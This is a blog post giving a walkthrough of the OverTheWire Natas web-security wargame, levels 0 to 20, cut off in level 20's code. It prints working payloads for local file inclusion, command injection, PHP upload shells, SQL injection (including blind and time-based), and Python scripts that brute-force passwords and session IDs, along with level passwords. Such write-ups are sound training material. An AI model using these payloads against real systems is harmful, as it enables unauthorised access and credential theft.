---
layout: post
title: "OverTheWire: Natas"
date: 2015-11-30 04:50:00 -0500
comments: true
categories: [writeups, wargames, linux]
keywords: overthewire, wargames, natas, overthewire natas, overthewire natas solutions, overthewire natas walkthrough
description: OverTheWire Natas wargame
---

Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at **http://natasX.natas.labs.overthewire.org**, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in **/etc/natas_webpass/**. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Start here:

Username: natas0

Password: natas0

URL:      http://natas0.natas.labs.overthewire.org

<!-- more -->

### Level 0


{% img center /images/overthewire/natas/natas0.png 'natas0' 'natas 0' %}

Look in the source for the following comment:

``` html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

### Level 1

{% img center /images/overthewire/natas/natas1.png 'natas1' 'natas 1' %}

You can still view the page source from the URL:

``` plain
view-source:http://natas1.natas.labs.overthewire.org/
```

Again, the password is in a comment:

``` html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

### Level 2

{% img center /images/overthewire/natas/natas2.png 'natas2' 'natas 2' %}

In the source you will see a directory path that you can navigate to:

``` html
<img src="files/pixel.png">
```
Go to http://natas2.natas.labs.overthewire.org/files/ and you will see a directory listing. Chech the users.txt file:

``` plain
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

### Level 3

{% img center /images/overthewire/natas/natas2.png 'natas3' 'natas 3' %}

There is a comment in the source again:

``` html
<!-- No more information leaks!! Not even Google will find it this time... -->
```

Well, since they mentioned Google, let's look for a robots.txt file..If you go to http://natas3.natas.labs.overthewire.org/robots.txt , you will see the following line: <code>Disallow: /s3cr3t/</code>. Navigate to http://natas3.natas.labs.overthewire.org/s3cr3t/ and there is another users.txt file: <code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</code>

### Level 4

{% img center /images/overthewire/natas/natas4.png 'natas4' 'natas 4' %}

If our access is permitted based on the Referer header, all we have to do is change it. I used Live HTTP Headers for the task. Changed the Referer, refreshed the page and: <code>Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</code>

### Level 5

{% img center /images/overthewire/natas/natas5.png 'natas5' 'natas 5' %}

So how do they determine if I'm logged in? A cookie maybe..I used Firebug to look at cookies, and indeed there is a loggedin cookie with the value of 0. Changed it to 1 and <code>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code>

### Level 6

{% img center /images/overthewire/natas/natas6.png 'natas6' 'natas 6' %}

This time we are also given the backend source code:

``` php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

That include directive stands out. If you go to http://natas6.natas.labs.overthewire.org/includes/secret.inc you get a blank page. But the source is not so blank:

``` php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Enter it in the form and <code>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code>

### Level 7

{% img center /images/overthewire/natas/natas7.png 'natas7' 'natas 7' %}

Inside the source there's a comment:

``` html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

Going to the Home and About pages, nothing interesting jumps out. However, combining the hint with how the URL looks like, I thought about local file inclusion. The normal URL is http://natas7.natas.labs.overthewire.org/index.php?page=home and I tried to read the password file by changing it to http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8 . And it worked! The password is <code>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code>

### Level 8

{% img center /images/overthewire/natas/natas6.png 'natas8' 'natas 8' %}

We have to look at PHP source code again:

``` php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

So it's looking for a string that matches the end result of all these conversions. Instead, we can reverse the process and decrypt the encoded secret to its original value. 

``` plain
# hex to binary 
3d3d516343746d4d6d6c315669563362 becomes 00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010 

# binary to ascii
00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010  becomes ==QcCtmMml1ViV3b

# reverse
==QcCtmMml1ViV3b becomes b3ViV1lmMmtCcQ==

# final base64 decode
b3ViV1lmMmtCcQ== becomes oubWYf2kBq
```

Input <code>oubWYf2kBq</code> in the form and you will get <code>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</code>

### Level 9

{% img center /images/overthewire/natas/natas9.png 'natas9' 'natas 9' %}

If you enter something, the backend greps for that word in a dictionary file:

``` php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

So I thought to terminate the first command and chain another one, that would read the password: <code>; cat /etc/natas_webpass/natas10</code>. And the password is output, along with the entire file: <code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code>

### Level 10

{% img center /images/overthewire/natas/natas10.png 'natas10' 'natas 10' %}

This level is the same as the last, except now there is some filtering in place:

``` php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This filtering doesn't exclude all characters that could be useful. If you read the *grep* manpage, you will come across this section:

> Anchoring
> The caret ^ and the dollar sign $ are meta-characters that respectively  match the empty string at the beginning and end of a line.

So I went ahead and tried <code>^ cat /etc/natas_webpass/natas11</code>, and the password was output, along with the rest of the file. This worked because *grep* returned every line containing the string that matches the beginning of the line (or end if you use $). I just added the password file for *grep* to read

``` plain
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
dictionary.txt:Americanisms
dictionary.txt:Americans
...
```

### Level 11

{% img center /images/overthewire/natas/natas11.png 'natas11' 'natas 11' %}

The backend code is more complicated:

``` php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Well, looking at the page, we see a *data* cookie that's base64 encoded, but decoding it gives rubbish because it's XOR encrypted. The PHP code operates on it. We can also set the background color by giving it a valid value.

Now for the code! Breaking it down:

* The default data is an array comprised of the values *showpassword* set to no and *bgcolor* set to #ffffff

* The xor_encrypt function performs XOR encryption on the given input

* The loadData function loads the data from the cookie, or keeps the default values if the data is invalid.

* The saveData function sets the cookie's value by the process of  <code>JSON encode -> XOR encrypt -> base64 encode</code>

At the end, we can see that if *showpassword* is set to yes, the password for the next level will be displayed. To achieve this, we have to mirror the cookie creation process, and change that value accordingly. But we don't have the key used for the XOR encryption. However, we know that in XOR encryption, <code>original xor key = encrypted</code>, and the following also applies: <code>original xor encrypted = key</code>. Because we have both the original data and the encrypted version, we can recover the key! 

I kept the original code since it does all the work, and only made some modifications to the variables:

``` php
// the value of the cookie after base64 decoding
$original = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');


function xor_encrypt($in) {
    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
    // the json encoded version of the default data
    $key = json_encode($defaultdata);
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print xor_encrypt($original);
```


Ran this through the PHP sandbox at http://sandbox.onlinephpfunctions.com/ and the result was the string <code>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</code>. The string *qw8J* gets repeated, this is the key! Now we can reuse the code to create a cookie encrypted with this key, and with *showpassword* set to yes:

``` php
$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
$json_data = json_encode($defaultdata);

function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return base64_encode($outText);
}

print xor_encrypt($json_data);
```

Running this code gives a new cookie value: <code>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</code>. Replace the cookie value in the page and you will get the next password: <code>The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code>

### Level 12

{% img center /images/overthewire/natas/natas12.png 'natas12' 'natas 12' %}

For this mission it seems we can upload a file to the server.

``` php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 
```

The code tests if the file satisfies the constraints and uploads it with a new name that's randomly generated. Then it gives you the link where you can find it: 

{% img center /images/overthewire/natas/upload.png 'upload' 'upload' %}

So I tried uploading a PHP file that would read the password for the next level:

``` plain
root@kali:~/Desktop# cat pass.php 
<?
echo(exec('cat /etc/natas_webpass/natas13'));
?>
```

But the extension is changed to a jpg, so the code doesn't get executed. Further in the HTML there is this line:

``` html
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```

I used Firebug to change the jpg extension to a php one and re-uploaded the file and this time it worked: <code>The file upload/g72k7zidu8.php has been uploaded</code>. Next I followed the link and inside was the password: <code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code>

### Level 13

{% img center /images/overthewire/natas/natas13.png 'natas13' 'natas 13' %}

Ok, this time they made a modification so that only jpg files can be uploaded..or so they claim. The code is the same as the last challenge, except for a new check:

``` php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```

**exif_imagetype()** reads the first bytes of an image and checks its signature. If the signature is invalid, it returns False.

This type of check can be fooled by providing the specific magic number for the file in question. The signature for jpg files is the hex value 0xFFD8FFE0

``` plain
root@kali:~/Desktop# echo -e '\xFF\xD8\xFF\xE0' > pass.php
root@kali:~/Desktop# echo "<?echo(exec('cat /etc/natas_webpass/natas13'));?>" >> pass.php 
```

The upload process is the same (don't forget to modify the extension with Firebug or other tools). Then I went to the link and the password is  <code>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</code>. If you notice the weird looking characters ÿØÿà before it, it's because the text representation of the jpg magic number is also echoed back. The password starts after that

### Level 14

{% img center /images/overthewire/natas/natas14.png 'natas14' 'natas 14' %}

Looking at the code hints at what type of vulnerability can be exploited:

``` php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?> 
```

No input sanitization = SQL injection! Moreover, we can get additional information by setting debug to True in the URL. For that, I also included the username and password fields in the URL: http://natas14.natas.labs.overthewire.org/index.php?debug=True&username=test&password=pass

And now there was a message showing the query that was run on the backend:

``` plain
 Executing query: SELECT * from users where username="test" and password="pass"
Access denied!
```

After seeing how the query looks like, I used the following injection string to fool the database:

username = can be anything

password = <code>pass" or 1=1-- </code>

To see why this works, look at the query now:

``` sql
Executing query: SELECT * from users where username="test" and password="pass" or 1=1-- "
```

By fixing the quotes we forced the database to evaluate an always true condition (1=1) and bypass the credentials check. The <code>-- </code> comments out the rest of the query which would otherwise break our injection. If you inject in the URL, don't forget that you need to URL encode the space (%20)

After the SQL injection, you will see this: <code>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</code>


### Level 15

{% img center /images/overthewire/natas/natas15.png 'natas15' 'natas 15' %}

This time you can check if a username exists or not. Let's look at the code:

``` php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?> 
```

We can again see the query that is being run on the backend by manipulating the URL: http://natas15.natas.labs.overthewire.org/index.php?debug=True&username=natas16

``` plain
Executing query: SELECT * from users where username="natas16"
This user exists.
```

So, this time the SQL code checks for the existence of a user and reports whether that username exists or not. We can't inject in a way that would directly give us the password like previously, but we know the query will be run against the *users* table, which contains both usernames and passwords. There is a way to bruteforce the natas16 password by forcing the database to check it one character at a time and report True of False (user exists or not). The statement to inject will look like this: <code>username=natas16" AND password LIKE BINARY "a%"-- </code>. Testing it in the URL (don't forget to encode the space after comments), you can check one character a time until the database respons with the user exists message. Then you know the password begins with the respective character and you can move on to the next. But the password is 32 characters long, so we will do it in an automated way!

Some explanation about the SQL keywords:

* The AND operator displays a record if both the first condition AND the second condition are true.

* The LIKE operator is used in a WHERE clause to search for a specified pattern in a column.

* The BINARY operator casts the string following it to a binary string. This is an easy way to force a column comparison to be done byte by byte rather than character by character. This causes the comparison to be case sensitive even if the column is not defined as BINARY or BLOB. BINARY also causes trailing spaces to be significant. 

* **%** 	A substitute for zero or more characters 

If you run this query with the debug parameter set, you will see how it looks like:

``` plain
Executing query: SELECT * from users where username="natas16"and password like binary "a%"-- "
```

When the entire statement is evaluated, the query will return True of False, and we will use that information to build the password. Here's a Python script to do the job:

``` python
import requests


passwd = ""
# this is the range of possible values
testchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
index = 0
while index < len(testchars):
 
    # binary keyword forces a case sensitive search
    query = dict(username="natas16\" AND password like BINARY \"" + \
                 passwd + testchars[index] + "%\" -- ",submit="Check existence")
    # example query: {'username': 'natas16" AND password like BINARY " a%" -- '}
    guess = requests.post('http://natas15.natas.labs.overthewire.org/', \
                      auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),\
                      params = query)
    # example encoded query (automatic encoding):
    # username=natas16%22+AND+password+like+BINARY+%22+a%25%22+--+
    if "This user exists" in guess.text:
       
        passwd += testchars[index]
        print passwd
        index = 0
        continue
    index += 1
```

The passwod will be slowly built like this:

``` plain
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
WaIHEacj63
WaIHEacj63w
WaIHEacj63wn
WaIHEacj63wnN
WaIHEacj63wnNI
WaIHEacj63wnNIB
WaIHEacj63wnNIBR
WaIHEacj63wnNIBRO
WaIHEacj63wnNIBROH
WaIHEacj63wnNIBROHe
WaIHEacj63wnNIBROHeq
WaIHEacj63wnNIBROHeqi
WaIHEacj63wnNIBROHeqi3
WaIHEacj63wnNIBROHeqi3p
WaIHEacj63wnNIBROHeqi3p9
WaIHEacj63wnNIBROHeqi3p9t
WaIHEacj63wnNIBROHeqi3p9t0
WaIHEacj63wnNIBROHeqi3p9t0m
WaIHEacj63wnNIBROHeqi3p9t0m5
WaIHEacj63wnNIBROHeqi3p9t0m5n
WaIHEacj63wnNIBROHeqi3p9t0m5nh
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

And now we have the password for natas16: <code>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</code>

### Level 16

{% img center /images/overthewire/natas/natas16.png 'natas16' 'natas 16' %}

``` php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Right, this is similar to level 9. This time, however, there is character filtering in place, so we can't use any of these: <code>;|&`\'"</code>. So there is no way to inject or chain commands..at the first glance! There is one useful character that is not filtered! The dollar sign! This is used in the bash shell in the same way as the backticks: for [command substitution](http://bash.cyberciti.biz/guide/Command_substitution) 

Basically, you can use it to run a command and store its output in a variable or display it with the *echo* command. It looks like this:

``` plain
root@kali:~# echo $(whoami)
root
```

So we want to bruteforce the password in the way we did before. Whatever we run with the $() command will be placed inside the $key variable, which is passed to grep against the dictionary file. If there is a match, the words containing it are displayed, else nothing is displayed. This is the behavior we will exploit for True and False values with our injection

Let's test it first. In the form field, I injected <code>$(echo matrix)</code>, and that return all the matches for that word:

``` plain
Output:

matrix
matrix's
matrixes
```

The code executed by the server ends up being <code>grep -i matrix dictionary.txt</code>. Now, if I inject a non-existent word, there is no output. So to check for the password, we will use a nested grep inside the main grep, that will look like this: <code>$(grep -E ^a.* /etc/natas_webpass/natas17)matrix</code>. This checks if the password starts with a, and we will then iterate over all characters. Let's imagine what happens if a is the first character of the password:

* the nested grep that we injected returns a, which is appended to the word we passed after, matrix in this case, so the server-side grep looks for the word amatrix in the dictionary file, and since that doesn't exist, nothing is returned. So we know that if nothing is returned, we had a match

* there is no match for the nested grep, so the matrix word remains unchanged, and the server returns all the matrix words, which means there was no match for the character we tried in the password

To automate the injection process, I wrote a Python script again:

``` python
#!/usr/bin/env python

import requests


testchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
index = 0
passwd = ""

while index != 32:
    for char in testchars:
            passwd += char
            payload = {'needle': "$(grep -E ^" + passwd + ".* /etc/natas_webpass/natas17)matrix", 'submit': 'Search'}      
            guess = requests.post('http://natas16.natas.labs.overthewire.org/?needle=',                             
                                 auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
                                 params = payload)                                                        
            response = guess.text
            print "Trying: ", passwd
            if "matrix" not in response:
                print "Password: ", passwd
                index += 1
                break
            else:
                # keep the chars that matched
                passwd = passwd[:-1]
print "Done! Password: ", passwd
```

And the output:
         
``` plain
Password:  8
Password:  8P
Password:  8Ps
Password:  8Ps3
Password:  8Ps3H
Password:  8Ps3H0
Password:  8Ps3H0G
Password:  8Ps3H0GW
Password:  8Ps3H0GWb
Password:  8Ps3H0GWbn
Password:  8Ps3H0GWbn5
Password:  8Ps3H0GWbn5r
Password:  8Ps3H0GWbn5rd
Password:  8Ps3H0GWbn5rd9
Password:  8Ps3H0GWbn5rd9S
Password:  8Ps3H0GWbn5rd9S7
Password:  8Ps3H0GWbn5rd9S7G
Password:  8Ps3H0GWbn5rd9S7Gm
Password:  8Ps3H0GWbn5rd9S7GmA
Password:  8Ps3H0GWbn5rd9S7GmAd
Password:  8Ps3H0GWbn5rd9S7GmAdg
Password:  8Ps3H0GWbn5rd9S7GmAdgQ
Password:  8Ps3H0GWbn5rd9S7GmAdgQN
Password:  8Ps3H0GWbn5rd9S7GmAdgQNd
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdk
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkh
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhP
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
Done! Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

Cool, we have the password for the next level: <code>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</code>

### Level 17

{% img center /images/overthewire/natas/natas15.png 'natas17' 'natas 17' %}

Again, a level similar to a previous one. This will be another case of SQL injection:

``` php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?> 
```

We know the database is vulnerable, but nothing is displayed to the screen, because the *echo* statements are commented out. So we're going in blind! To determine if the database returns True or False to our query, we can use time-based SQL injection, by making the database load longer if our query is true, and normal if not. I tested it with this injection string: <code>natas18" AND SLEEP(5)-- </code>. As expected, since the user natas18 exists, the page took 5 seconds to load. When the username didn't exist, it loaded instantly. So the sleep function is executed if the previous part of the query was true, but not if it's false. With this in mind, I modified the Python script I used before:

``` python
import requests

passwd = ""
testchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
index = 0
while index < len(testchars):
    query = {'username': 'natas18" and password like binary ' + '"' + passwd + testchars[index] + '%" ' + 'and sleep(15)-- ', 'submit': 'Check existence'}
    try:
        guess = requests.post('http://natas17.natas.labs.overthewire.org/', \
                          auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),\
                          params = query, \
                          timeout=10) # how many seconds to wait for a response
    except requests.Timeout:
        passwd += testchars[index]
        print 'Password: ', passwd
        index = 0
        continue
    index += 1
print 'Done! Password is ', passwd
```

This took long because I had to use higher values for sleep() and timeout..the script kept stopping early with shorter times. Anyway, skipping the build-up output, the passwod is <code>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</code>

### Level 18

{% img center /images/overthewire/natas/natas18.png 'natas18' 'natas 18' %}

``` php
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { 
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}

function isValidID($id) { 
    return is_numeric($id);
}

function createID($user) { 
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg) { 
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start() { 
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}

function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}


$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
} 


?> 
```

This is a lot of code, but first let's see its behavior. When you enter something in the form, a random PHPSESSID between 1 and 640 is created. Then you see the message that you are logged in as a regular user. If you turn debug on and try tampering with the cookie, you will see the message that the session was old and the admin flag was set. The objective appears to be to log in with an admin session ID, and then the credentials for the next level will be printed to the screen. The first time I looked over the code and noticed the fact that the $maxid can be predicted and bruteforced, I thought that's the way to go, but first to understand the code: 

* the $maxid holds the maximum value of a PHPSESSID -> 640

* isValidAdminLogin() just returns 0, so whenever it's called it will set the admin session ID to 0 (not what we want)

* isValidID($id) returns True if the ID is a valid number or numeric string, False otherwise

* createID($user) this is the function that creates the PHPSESSID, with a random value between 1 and 640 (predictable and not long to bruteforce, not what we want in a session ID)

* debug($msg) this just prints messages such as session started, etc.

* my_session_start() this starts a session if there is a valid PHPSESSID cookie, and sets the admin session ID to 0 if it doesn't exist in the $_SESSION array

* print_credentials() prints the password we're after if there is an admin session ID that's set to 1 in the $_SESSION array. Otherwise it just prints a regular message

Well, the main vulnerabilities are the predictable session ID and the fact that the session starts based on the existence and validity of a cookie, which we can freely control. Since we need to be admin for the next level, we have to bruteforce the session cookies until we hit upon the one with the admin flag set to 1. Python to the rescue again:

``` python
import requests


success = 'You are an admin'
session_id = 0
while session_id < 640:
    cookie = {'PHPSESSID': str(session_id)}
    print 'Trying with session ID: ' + str(session_id)
    guess = requests.get('http://natas18.natas.labs.overthewire.org/', \
                          auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), \
                          cookies=cookie)
    if success in guess.text:
        print guess.text
        print 'Admin session ID was: ' + str(session_id)
        break
    session_id += 1
```

I ran it and it discovered the admin session ID was 46. Password for the next level is <code>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</code>


### Level 19
    
{% img center /images/overthewire/natas/natas19.png 'natas19' 'natas 19' %}

We don't have source code this time and apparently the session IDs aren't sequential anymore..Let's see. I logged in with some dummy values and noticed the PHPSESSID cookie is hex encoded now. Decoding it..surprise! It looked like this: <code>512-admin</code>. *admin* was what I put in the username field. I tried more bogus values for username and password and noticed that the session ID cookie is always constructed like this: <code>*random number-username*</code>. So again, brute forcing to the rescue! Since I didn't know how much of the code from the previous challenge has changed, I assumed the max session ID value remained the same:

``` python
import requests


success = 'You are an admin'
session_id = 0
while session_id < 640:
    pattern = str(session_id) + '-admin'
    cookie = {'PHPSESSID': pattern.encode('hex')}
    print 'Trying with session ID: ' + pattern
    guess = requests.get('http://natas19.natas.labs.overthewire.org/', \
                          auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), \
                          cookies=cookie)
    if success in guess.text:
        print guess.text
        print 'Admin session ID was: ' + pattern
        print cookie
        break
    session_id += 1
    
```

And after a while I hit the jackpot with a sessiod ID of *381-admin*. The password for the next level is <code>eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</code>

### Level 20

{% img center /images/overthewire/natas/natas20.png 'natas20' 'natas 20' %}

Code:

``` php
<?

function debug($msg) { 
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
